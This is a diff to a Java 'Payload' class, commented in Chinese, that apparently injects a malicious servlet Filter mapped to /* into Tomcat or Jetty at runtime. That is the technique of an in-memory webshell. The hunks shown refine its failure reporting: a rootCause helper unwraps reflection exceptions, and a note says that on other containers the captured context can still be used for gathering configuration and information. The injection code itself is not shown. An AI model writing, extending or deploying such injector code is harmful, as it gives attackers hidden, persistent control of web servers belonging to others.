@@ -1462,6 +1462,13 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
         } else {
             sb.append(",\"reason\":").append(json("载体未注入 ServletContext"));
         }
+        // 非 Tomcat/Jetty 没有专用路径：它们的 Filter 链基本在部署期就算好了（Undertow 的
+        // addFilter 直接抛 servletContextAlreadyInitialized，Jetty 是 IllegalStateException），
+        // servletcontext 这条只在「上下文还没初始化」时才可能成。
+        if (!"tomcat".equals(kind) && !"jetty".equals(kind) && sApp != null) {
+            sb.append(",\"note\":").append(json("该容器不支持运行期注册 Filter（Undertow/Jetty 已实测被容器拒绝），"
+                    + "servletcontext 路径大概率失败；探到的 context 仍可用于读配置/信息收集"));
+        }
         return sb.append('}').toString();
     }
 
@@ -1511,9 +1518,12 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
                         + " param=" + cp + " url=/* via=" + order[i]
                         + " container=" + containerKind();
             } catch (Throwable t) {
-                err.append(order[i]).append(" 失败(").append(t.getClass().getSimpleName());
-                if (t.getMessage() != null) {
-                    err.append(": ").append(t.getMessage());
+                // 反射 + Proxy 会把真实异常裹两层，只报 InvocationTargetException 等于没说：
+                // 真正有用的是最内层的 servletContextAlreadyInitialized 这类原因。
+                Throwable c = rootCause(t);
+                err.append(order[i]).append(" 失败(").append(c.getClass().getSimpleName());
+                if (c.getMessage() != null) {
+                    err.append(": ").append(c.getMessage());
                 }
                 err.append("); ");
             }
@@ -1726,9 +1736,12 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
                     return r;
                 }
             } catch (Throwable t) {
-                err.append(order[i]).append(" 失败(").append(t.getClass().getSimpleName());
-                if (t.getMessage() != null) {
-                    err.append(": ").append(t.getMessage());
+                // 反射 + Proxy 会把真实异常裹两层，只报 InvocationTargetException 等于没说：
+                // 真正有用的是最内层的 servletContextAlreadyInitialized 这类原因。
+                Throwable c = rootCause(t);
+                err.append(order[i]).append(" 失败(").append(c.getClass().getSimpleName());
+                if (c.getMessage() != null) {
+                    err.append(": ").append(c.getMessage());
                 }
                 err.append("); ");
             }
@@ -1986,6 +1999,22 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
             }
         }
         return "unknown";
+    }
+
+    /** 剥掉反射/代理的包装层，拿到真正有信息量的那一层异常。 */
+    private static Throwable rootCause(Throwable t) {
+        Throwable c = t;
+        for (int i = 0; i < 8; i++) {
+            boolean wrapper = c instanceof java.lang.reflect.InvocationTargetException
+                    || c instanceof java.lang.reflect.UndeclaredThrowableException
+                    || c instanceof ExceptionInInitializerError;
+            if (wrapper && c.getCause() != null && c.getCause() != c) {
+                c = c.getCause();
+            } else {
+                break;
+            }
+        }
+        return c;
     }
 
     private static String servletApi() {
